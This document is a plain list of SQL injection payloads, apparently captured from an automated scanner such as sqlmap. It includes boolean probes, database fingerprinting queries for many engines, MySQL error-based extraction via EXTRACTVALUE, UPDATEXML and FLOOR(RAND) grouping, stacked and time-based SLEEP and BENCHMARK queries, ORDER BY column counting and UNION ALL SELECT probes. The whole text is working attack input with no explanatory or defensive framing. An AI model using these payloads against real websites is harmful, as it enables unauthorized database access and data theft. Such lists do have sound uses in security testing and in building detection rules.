"4,(()."".,)'"
"4'tOcBVa<'"">IeAjDn"
4) AND 8188=9186-- QLgt
4) AND 1583=1583-- refb
4') AND 8219=6163-- nlfM
4') AND 1583=1583-- NAWA
4' AND 3209=3746-- dMHM
4' AND 1583=1583-- zBfQ
"4"" AND 3400=8299-- EogF"
"4"" AND 1583=1583-- QADb"
4) AND 3302=5477 AND (6891=6891
4) AND 1583=1583 AND (6367=6367
4)) AND 3168=5782 AND ((2492=2492
4)) AND 1583=1583 AND ((6508=6508
4))) AND 3010=4109 AND (((5468=5468
4))) AND 1583=1583 AND (((3814=3814
4 AND 4311=2500
4 AND 1583=1583
4 AND 9999=8441
4 AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL
"4 AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL"
4 AND (SELECT %SQLUPPER NULL) IS NULL
4 AND (SELECT halfMD5(NULL) IS NULL) IS NULL
4 AND (SELECT MD5(NULL~NULL)) IS NULL
4 AND (SELECT (NULL SETEQ NULL)) IS NULL
4 AND (SELECT CHR(118)||CHR(118)||CHR(105)||CHR(107) FROM SYSIBM.SYSDUMMY1)='vvik'
"4 AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL"
4 AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL
4 AND (SELECT 'QVdI' FROM RDB$DATABASE)='QVdI'
4 AND (SELECT 'bzYW' FROM INFORMATION_SCHEMA.IO_STATISTICS)='bzYW'
4 AND (SELECT STRINGTOUTF8(NULL)) IS NULL
4 AND (SELECT CHAR(68)||CHAR(117)||CHAR(119)||CHAR(80) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='DuwP'
4 AND (SELECT 'Nsyz' FROM SYSMASTER:SYSDUAL)='Nsyz'
4 AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL
4 AND (SELECT TONUMBER(NULL)) IS NULL
4 AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL
4 AND (SELECT CODE(NULL)) IS NULL
"4 AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL"
4 AND (SELECT QUARTER(NULL XOR NULL)) IS NULL
4 AND (SELECT 0x4d707773)='UfRN'
"4 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(6427=6427,1))),0x717a716a71,0x78))s), 8446744073709551610, 8446744073709551610)))"
"4 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(1945=1945,1))),0x717a716a71,0x78))s), 8446744073709551610, 8446744073709551610)))"
"4 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(9707=9707,1))),0x717a716a71,0x78))x))"
"4 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(6439=6439,1))),0x717a716a71,0x78))x))"
"4 AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(9015=9015,1))),0x717a716a71),9015)"
"4 OR GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(2584=2584,1))),0x717a716a71),2584)"
"4 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176626a71,(SELECT (ELT(7180=7180,1))),0x717a716a71)) USING utf8)))"
"4 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176626a71,(SELECT (ELT(2045=2045,1))),0x717a716a71)) USING utf8)))"
"4 AND (SELECT 8602 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(8602=8602,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
"4 OR (SELECT 2331 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(2331=2331,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
"4 AND EXTRACTVALUE(6870,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(6870=6870,1))),0x717a716a71))"
"4 OR EXTRACTVALUE(4808,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4808=4808,1))),0x717a716a71))"
"4 AND UPDATEXML(2047,CONCAT(0x2e,0x7176626a71,(SELECT (ELT(2047=2047,1))),0x717a716a71),2499)"
"4 OR UPDATEXML(2616,CONCAT(0x2e,0x7176626a71,(SELECT (ELT(2616=2616,1))),0x717a716a71),3480)"
"4 AND ROW(5717,6656)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5717=5717,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM (SELECT 1325 UNION SELECT 2968 UNION SELECT 1270 UNION SELECT 1634)a GROUP BY x)"
"4 OR ROW(3938,1799)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(3938=3938,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM (SELECT 2709 UNION SELECT 4598 UNION SELECT 6877 UNION SELECT 4401)a GROUP BY x)"
-8587
"-1525 OR 1 GROUP BY CONCAT(0x7176626a71,(SELECT (CASE WHEN (6151=6151) THEN 1 ELSE 0 END)),0x717a716a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
"4 PROCEDURE ANALYSE(EXTRACTVALUE(5249,CONCAT(0x5c,0x7176626a71,(SELECT (CASE WHEN (5249=5249) THEN 1 ELSE 0 END)),0x717a716a71)),1)"
"(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(2234=2234,1))),0x717a716a71,0x78))s), 8446744073709551610, 8446744073709551610)))"
"EXP(~(SELECT * FROM (SELECT CONCAT(0x7176626a71,(SELECT (ELT(8263=8263,1))),0x717a716a71,0x78))x))"
"GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(6346=6346,1))),0x717a716a71),6346)"
"JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176626a71,(SELECT (ELT(5434=5434,1))),0x717a716a71)) USING utf8)))"
"(SELECT 8129 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(8129=8129,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
"(UPDATEXML(2250,CONCAT(0x2e,0x7176626a71,(SELECT (ELT(2250=2250,1))),0x717a716a71),7825))"
"(EXTRACTVALUE(1925,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(1925=1925,1))),0x717a716a71)))"
"(SELECT CONCAT(CONCAT('qvbjq',(CASE WHEN (6476=6476) THEN '1' ELSE '0' END)),'qzqjq'))"
"(SELECT CONCAT(0x7176626a71,(ELT(3599=3599,1)),0x717a716a71))"
4;SELECT SLEEP(5)#
4;SELECT SLEEP(5)
4;(SELECT * FROM (SELECT(SLEEP(5)))FOAO)#
4;(SELECT * FROM (SELECT(SLEEP(5)))vpTF)
"4;SELECT BENCHMARK(5000000,MD5(0x44704f4d))#"
"4;SELECT BENCHMARK(5000000,MD5(0x52504d46))"
4 AND (SELECT 8012 FROM (SELECT(SLEEP(5)))Bbyr)
4 AND (SELECT 8012 FROM (SELECT(SLEEP(0)))Bbyr)
4 AND (SELECT 8012 FROM (SELECT(SLEEP(5)))Bbyr)
4 ORDER BY 1-- -
4 ORDER BY 8898-- -
4 ORDER BY 10-- -
4 ORDER BY 6-- -
4 ORDER BY 4-- -
4 ORDER BY 3-- -
4 ORDER BY 2-- -
"4 UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x70454e5669427a4b496d45624948735365696d524651595a6c50766a416870764c734e5161466a61,0x717a716a71)-- -"
"4 UNION ALL SELECT CONCAT(0x7176626a71,0x725974655769654276636f46724c43785950595370496a4477766f627577546e736a654668565364,0x717a716a71),NULL-- -"
"4 UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x63484641727a4c6c6b64,0x717a716a71)-- -"
"4 UNION ALL SELECT CONCAT(0x7176626a71,0x765a717a786e4f585064,0x717a716a71),NULL-- -"
"-2822 UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x79427272677366704b676f6a5a6779536a52714e456a4576626272664d794b5442616d7661616d4a,0x717a716a71)-- -"
"-5373 UNION ALL SELECT CONCAT(0x7176626a71,0x586d444658756d6a65694356566c727a5948725a6d42757363526a52517a544b6158734e57706766,0x717a716a71),NULL-- -"
"-3035 UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x4142464c6f4f4b79786f,0x717a716a71)-- -"
"-4215 UNION ALL SELECT CONCAT(0x7176626a71,0x5575587a4f4d7458674b,0x717a716a71),NULL-- -"
"4 UNION ALL SELECT CONCAT(0x7176626a71,0x747743544477537a47704f557563657343737057416c436e745a4e71716965465477767467596442,0x717a716a71),34-- -"
"4 UNION ALL SELECT 34,CONCAT(0x7176626a71,0x4c734b67447677654672536f626c6f684c726f6945484673516c414b47746e457052566557776b75,0x717a716a71)-- -"
"4 UNION ALL SELECT CONCAT(0x7176626a71,0x445a457247624277735a,0x717a716a71),34-- -"
"4 UNION ALL SELECT 34,CONCAT(0x7176626a71,0x45767a5a586869444845,0x717a716a71)-- -"
"-3811 UNION ALL SELECT CONCAT(0x7176626a71,0x6d6d6d696a464b575373654751616d68674442654975697976564b6f61764b4a424e636e6c6c656d,0x717a716a71),34-- -"
"-5158 UNION ALL SELECT 34,CONCAT(0x7176626a71,0x75646a6d486c6b4b6e4541666b655067664d51616376516962445741756a6677416b4565434e6656,0x717a716a71)-- -"
"-8791 UNION ALL SELECT CONCAT(0x7176626a71,0x7a744d756b6f49517973,0x717a716a71),34-- -"
"-1479 UNION ALL SELECT 34,CONCAT(0x7176626a71,0x526573474658524a474a,0x717a716a71)-- -"
4 UNION ALL SELECT NULL-- -
